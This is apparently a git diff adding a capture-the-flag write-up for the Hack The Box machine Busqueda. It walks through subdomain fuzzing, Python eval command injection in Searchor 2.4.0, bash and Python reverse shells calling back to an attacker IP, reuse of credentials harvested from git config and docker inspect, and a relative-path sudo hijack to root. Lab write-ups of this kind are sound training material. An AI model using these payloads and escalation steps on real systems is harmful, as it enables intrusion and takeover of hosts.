@@ -63,8 +63,8 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 9.85 seconds
 ```
 
-We see two ports are open, port 22 (SSH) and port 80 (HTTP). Based on these [versions](https://launchpad.net/ubuntu/+source/openssh/1:8.9p1-3ubuntu0.1), we can see that the machine is running Ubuntu 22.04 (Jammy Jellyfish)
-Nmap also detects a domain name `searcher.htb` which we can add to our `/etc/hosts` file.
+We see two ports are open, port 22 (SSH) and port 80 (HTTP). Based on these [versions](https://launchpad.net/ubuntu/+source/openssh/1:8.9p1-3ubuntu0.1), it's likely the machine is running Ubuntu 22.04 (Jammy Jellyfish).
+Nmap also detects a domain name `searcher.htb`, which we can add to our `/etc/hosts` file.
 
 ```shell
 echo "10.129.175.69  searcher.htb" | sudo tee -a /etc/hosts
@@ -73,7 +73,436 @@ echo "10.129.175.69  searcher.htb" | sudo tee -a /etc/hosts
 ### Subdomain fuzz
 
 Given the domain name, we can try to fuzz subdomains using the [wfuzz](https://github.com/xmendez/wfuzz) tool and see if we can find anything interesting.
+We hide responses with a length of 26 characters so we don't get a lot of false positives.
 
 ```shell
-
+wfuzz -c -u "http://searcher.htb" -H "Host: FUZZ.searcher.htb" \
+-w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --hw=26
 ```
+
+No results are found.
+
+##### Note on Gitea subdomain
+
+At first, I was lazy and ran this command with the `subdomains-top1million-5000.txt` and `fierce-hostlist.txt` wordlists, but I didn't find anything.
+Anyway, later when I discovered the `gitea` instance. I found out that `n0kovo_subdomains.txt` had a lot more subdomains that I missed.
+
+```shell
+# Searching for gitea in the wordlists
+grep -R "^gitea$" /usr/share/SecLists/Discovery/DNS/ -n
+
+./namelist.txt:54898:gitea
+./n0kovo_subdomains.txt:9767:gitea # <--- In line 9767
+./dns-Jhaddix.txt:656722:gitea
+
+# Running wfuzz with the n0kovo_subdomains.txt wordlist
+wfuzz -c -u "http://searcher.htb" -H "Host: FUZZ.searcher.htb" \
+-w /usr/share/SecLists/Discovery/DNS/n0kovo_subdomains.txt --hw=26
+
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://searcher.htb/
+Total requests: 3000000
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload
+=====================================================================
+000009767:   200        267 L    1181 W     13125 Ch    "gitea"
+```
+
+**So always keep in mind to try different wordlists and not just the ones you are used to.**
+
+## Searcher.htb
+
+Visiting the website, we see instructions on how to use the search functionality. There are some links but they don't redirect anywhere.
+
+![Searcher.htb website](/images/htb-busqueda-writeup/searcher-main-page.png)
+
+In the footer of the page, we can see the website is running [Flask](https://flask.palletsprojects.com/en/2.0.x/),
+a Python web framework and the [Searchor](https://github.com/ArjunSharda/Searchor) library with the exact version: `2.4.0`.
+
+![Searcher.htb website footer](/images/htb-busqueda-writeup/searcher-query-input.png)
+
+We can confirm it's running `Python` by looking at the headers.
+
+```shell
+curl -s http://searcher.htb -I
+
+HTTP/1.1 200 OK
+Date: Fri, 16 Jun 2023 22:08:30 GMT
+Server: Werkzeug/2.1.2 Python/3.10.6
+Content-Type: text/html; charset=utf-8
+Content-Length: 13519
+```
+
+## Shell as svc
+
+### Searching for vulnerabilities
+
+Knowing which library is being used, we can search for vulnerabilities in Google.
+We find Snyk has a [vulnerability](https://security.snyk.io/package/pip/searchor/2.4.0) for this version of the library
+but not Proof of Concept is provided. We can try to find the vulnerability ourselves.
+
+![Searchor library vulnerability](/images/htb-busqueda-writeup/vulnerability-sneak-page.png)
+
+A simple search containing the `eval` keyword in the **Issues** tab of the GitHub repository reveals a discussion
+about replacing the `eval` function with other safer alternatives.
+
+![Searchor library eval discussion](/images/htb-busqueda-writeup/issue-eval-github.png)
+
+That leads to this [commit](https://github.com/ArjunSharda/Searchor/pull/130/commits/29d5b1f28d29d6a282a5e860d456fab2df24a16b)
+belonging to a pull request that fixes the vulnerability. We can see how was the `eval` function being used before the fix.
+
+![Searchor library eval commit](/images/htb-busqueda-writeup/removed-eval-commit.png)
+
+Great! It seems that we have an initial vector to exploit the application. We can now see how is the request being made to the server
+and see if we can inject a command in any of the parameters.
+
+### Command injection
+
+After making a basic search, we can use [Burp Suite](https://portswigger.net/burp) to intercept the request
+and send it to the repeater to inspect it. We see it's using the query parameter to make the search.
+
+![Searcher.htb request in Burp Suite](/images/htb-busqueda-writeup/burpsuite-request-demo.png)
+
+As we previously saw in the GitHub commit, the `eval` function is being used to execute the query. So why not try to inject a command?
+Knowing it's Python, we can search for a python payload and see if it works.
+We need to keep in mind we need to escape correctly the payload so it doesn't break the application code.
+
+```python
+## Searchor library eval function
+url = eval(
+    f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
+)
+
+## Our payload would be something like this
+payload = ',__import__("os").system("id"))#'
+
+## So that way when the request is made, it would end up like this
+url = eval(
+    f"Engine.{engine}.search('', __import__("os").system("id"))#, copy_url={copy}, open_web={open})"
+    # The `#` in Python means comment, so the rest of the code is ignored
+)
+```
+
+From the code above, we can see we correctly escaped the parameter being passed to the search function as we close it with ', and commented the rest of the code with `#`.
+Now, we can inject our payload and see if it works. First I'm gonna try get a hit on my local webserver. I'm gonna encode the
+command in `base64` because there might be special characters `('-', '&', ' ')` that may not be correctly escaped.
+
+```shell
+## Start a webserver to capture the request
+python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+
+## Make the request with the payload
+`echo -n 'curl 10.10.14.108:8000' | base64 -w0`
+Y3VybCAxMC4xMC4xNC4xMDg6ODAwMA==
+```
+
+We modify the request and see if we get a hit on our webserver.
+
+![Searcher.htb request with payload](/images/htb-busqueda-writeup/burp-command-demo.png)
+
+```shell
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.175.69 - - [16/Jun/2023 19:03:03] "GET / HTTP/1.1" 200 -
+```
+
+Great! We got a hit on our webserver. Now we can modify the payload and try to get a reverse shell.
+We modify the base64 payload and substitute every `+` with `%2B` as it means `+` in URL encoding so it doesn't break the request.
+
+```shell
+## Get the reverse shell payload
+echo -ne "bash -c 'bash -i >& /dev/tcp/10.10.14.108/9001 0>&1'" | base64 | sed -r 's/[+]+/%2B/g'
+YmFzaCAtYyAnYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4xMC4xNC4xMDgvOTAwMSAwPiYxJw==
+
+## Start a netcat listener
+nc -lvnp 9001
+```
+
+![Burpsuite searcher RCE](/images/htb-busqueda-writeup/burpsuite-query-rce.png)
+
+And we got a shell as `svc`. We can do the stty trick to get a PTY.
+One my idols **0xdf** has a great [video](https://www.youtube.com/watch?v=DqE6DxqJg8Q&ab_channel=0xdf) explaining this trick.
+
+```shell
+svc@busqueda:/var/www/app$ script /dev/null -c bash
+script /dev/null -c bash
+Script started, output log file is '/dev/null'.
+svc@busqueda:/var/www/app$ ^Z # Ctrl + Z
+[1]  +  Stopped  script /dev/null -c bash
+
+
+stty raw -echo; fg
+[1]  + continued  nc -lnvp 9001
+                               reset screen
+svc@busqueda:/var/www/app$ export TERM=xterm
+```
+
+And grab the user flag.
+
+```shell
+svc@busqueda:~$ cat user.txt
+6952c372***********************
+```
+
+## Privilege escalation
+
+### Git credentials
+
+I will run `sudo -l` to see if there's any command we can run as sudo.
+
+```shell
+svc@busqueda:~$ sudo -l
+[sudo] password for svc:
+```
+
+It asks for password. Since we got access with a reverse shell, we don't know the password. Time to look in another direction.
+
+Looking at the files in the home directory, we see a `.git-credentials` file. This file is used to store credentials for Git repositories.
+[Git](https://git-scm.com/) is a version control system that allows us to keep track of changes in our code.
+A git repository can be hosted in a remote server such as [GitHub](https://github.com/) or [GitLab](https://about.gitlab.com/).
+
+> Git is an open-source distributed version control system. It is designed to handle minor to major projects with high speed and efficiency.
+> It is developed to co-ordinate the work among the developers. The version control allows us to track and work together with our team members at the same workspace.
+
+We look at the file but it only reveals the name and the email that are going to be used when making commits. Knowing this, we can search for a git repository.
+I'll be looking for `/var/www/app` where the application is running.
+
+```shell
+svc@busqueda:/var/www/app$ ls -la
+total 20
+drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
+drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
+-rw-r--r-- 1 www-data www-data 1124 Dec  1  2022 app.py
+drwxr-xr-x 8 www-data www-data 4096 Jun 17 16:33 .git
+drwxr-xr-x 2 www-data www-data 4096 Dec  1  2022 templates
+```
+
+We see there's a `.git` directory. Diving into it, we see there's a `config` file that contains the credentials for the repository.
+
+```shell
+svc@busqueda:/var/www/app/.git$ cat config
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[remote "origin"]
+        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
+        fetch = +refs/heads/*:refs/remotes/origin/*
+[branch "main"]
+        remote = origin
+        merge = refs/heads/main
+```
+
+We see hardcoded credentials for the user cody and a `gitea` instance. I'll add the domain to my `/etc/hosts` file,
+but I'll take a look at the Apache configuration file first to see where's this virtual host pointing to.
+
+```shell
+svc@busqueda:/var/www/app/.git$ cat /etc/apache2/sites-enabled/000-default.conf
+[...SNIP]
+[...SNIP]
+
+<VirtualHost *:80>
+        ProxyPreserveHost On
+        ServerName gitea.searcher.htb
+        ServerAdmin admin@searcher.htb
+        ProxyPass / http://127.0.0.1:3000/
+        ProxyPassReverse / http://127.0.0.1:3000/
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+</VirtualHost>
+```
+
+We confirm there was a `gitea` subdomain that I missed when fuzzing subdomains. Anyway, we now can login as `cody` with the credentials we found
+and see if there private repositories or previous commits that may contain sensitive information.
+
+![Gitea cody login](/images/htb-busqueda-writeup/gitea-cody-dashboard.png)
+
+We see there's a private repository called `Searcher_site` and there's another `administrator` user.
+The source code in the repository is the same as the one we saw in the machine, so there's nothing interesting there.
+
+### Python script
+
+Earlier we tried to run `sudo -l` but it asked for a password. Now that we have a hardcoded password
+we can look for password reuse and see if that's the password for the `svc` user.
+
+```shell
+svc@busqueda:/var/www/app/.git$ sudo -l
+[sudo] password for svc:
+Matching Defaults entries for svc on busqueda:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User svc may run the following commands on busqueda:
+    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
+```
+
+Effectively, we can run a python script as root. We can see the script is located in `/opt/scripts/system-checkup.py`.
+We try to read the file but we don't have permissions, that's because others only have read permissions.
+
+```shell
+svc@busqueda:~$ ls -la /opt/scripts/
+total 28
+drwxr-xr-x 3 root root 4096 Dec 24 18:23 .
+drwxr-xr-x 4 root root 4096 Mar  1 10:46 ..
+-rwx--x--x 1 root root  586 Dec 24 21:23 check-ports.py
+-rwx--x--x 1 root root  857 Dec 24 21:23 full-checkup.sh
+drwxr-x--- 8 root root 4096 Apr  3 15:04 .git
+-rwx--x--x 1 root root 3346 Dec 24 21:23 install-flask.sh
+-rwx--x--x 1 root root 1903 Dec 24 21:23 system-checkup.py
+```
+
+Let's run the script and see what it does.
+
+```shell
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py test
+Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
+
+     docker-ps     : List running docker containers
+     docker-inspect : Inpect a certain docker container
+     full-checkup  : Run a full system checkup
+```
+
+The scripts have different actions we can run. This is something related to [Docker](https://www.docker.com/).
+Docker is a tool that allows us to run applications in containers.
+A container is a lightweight, standalone, executable package of software that includes everything needed to run an
+application: code, runtime, system tools, system libraries and settings. The official page has a great [explanation](https://www.docker.com/resources/what-container).
+
+Running `docker-ps` as it description says, lists the running containers.
+
+```shell
+svc@busqueda:~$
+CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   5 months ago   Up 3 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   5 months ago   Up 3 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+```
+
+We see two containers, one running `gitea` and another running `mysql`. There's also an option in the script to inspect a container.
+Now let's run `docker-inspect` to see what it does.
+
+```shell
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect gitea
+Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
+```
+
+It asks for a format and a container name. To learn more about this command, we can look at the
+[official documentation](https://docs.docker.com/engine/reference/commandline/inspect/). We can see there's a `--format` flag
+that allows us to specify the format of the output. I'm going to use one of their
+[examples](https://docs.docker.com/engine/reference/commandline/inspect/#get-a-subsection-in-json-format) and print the output in `json` format.
+We can pipe it into `jq` to make it more readable.
+
+```shell
+svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect \
+'{{json .Config}}' gitea | jq .
+
+{
+  [...SNIP]
+  "Env": [
+    "USER_UID=115",
+    "USER_GID=121",
+    "GITEA__database__DB_TYPE=mysql",
+    "GITEA__database__HOST=db:3306",
+    "GITEA__database__NAME=gitea",
+    "GITEA__database__USER=gitea",
+    "GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh",
+    "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin",
+    "USER=git",
+    "GITEA_CUSTOM=/data/gitea"
+  ]
+}
+```
+
+We see some environment variables, the most interesting one is `GITEA__database__PASSWD` as it contains a hardcoded password.
+We can do the same with the `mysql_db` container and we will end up with the following combinations:
+
+- **`root`:jI86kGUuj87guWr3RyF**
+- **`gitea`:yuiu1hoiu4i5ho1uh**
+
+### Root shell
+
+We can try to login as `root` with the password we found. We can use `su` to switch users.
+
+```shell
+svc@busqueda:~$ su root
+Password:
+su: Authentication failure
+```
+
+None of the passwords work. We had a `administrator` user in the `gitea` instance. We can try to login as `administrator` with the passwords we found
+and effectively we gained access.
+
+![Gitea administrator repo](/images/htb-busqueda-writeup/admin-gitea-repo.png)
+
+We see there are the same scripts we saw in the machine at `/opt/scripts`. We can inspect the `system-checkup.py` script and see what it does.
+The script is pretty straightforward, it takes an action, and based on the action it runs a function that executes a command.
+There's one interesting:
+
+```python
+[...SNIP]
+elif action == 'full-checkup':
+    try:
+        arg_list = ['./full-checkup.sh'] # <--- Interesting line
+        print(run_command(arg_list))
+        print('[+] Done!')
+    except:
+        print('Something went wrong')
+        exit(1)
+[...SNIP]
+```
+
+It's using a relative path to execute a script. We can abuse this and create a script with the same name in a writable directory and get a root shell.
+At first, I did fail at this because I was trying to run a shell script as the extension ends in `.sh`.
+It turns out the script is running with `python3` so we need to create a python script. I'm dumb sometimes.
+
+We save the file and make it executable. We start a `netcat` listener in our machine and run the script to see if we get a root shell.
+
+```shell
+svc@busqueda:/tmp$ cat <<EOF > full-checkup.sh
+> #!/usr/bin/python3
+> import socket, os, pty;
+>
+> s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
+> s.connect(("10.10.14.108", 9003));
+> os.dup2(s.fileno(),0);
+> os.dup2(s.fileno(),1);
+> os.dup2(s.fileno(),2);
+> pty.spawn("/bin/bash")
+> EOF
+
+svc@busqueda:/tmp$ chmod +x full-checkup.sh
+
+## In our machine
+nc -lvnp 9003
+```
+
+And we got a root shell.
+
+```shell
+svc@busqueda:/tmp$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+## In our machine
+nc -lnvp 9003
+listening on [any] 9003 ...
+connect to [10.10.14.108] from (UNKNOWN) [10.129.175.69] 42706
+root@busqueda:/dev/shm#
+```
+
+And we can grab the root flag.
+
+```shell
+root@busqueda:~# cat root.txt
+0a05bfc5************************
+```
+
+## Automated tools
+
+I wrote a small shell script to automate the process of getting a reverse shell as `svc` user.
+It uses the same payload we used in Burp Suite. You can download it and run it.
+
+- **[874anthony searchor script](https://github.com/874anthony/searchor-rce-script)**
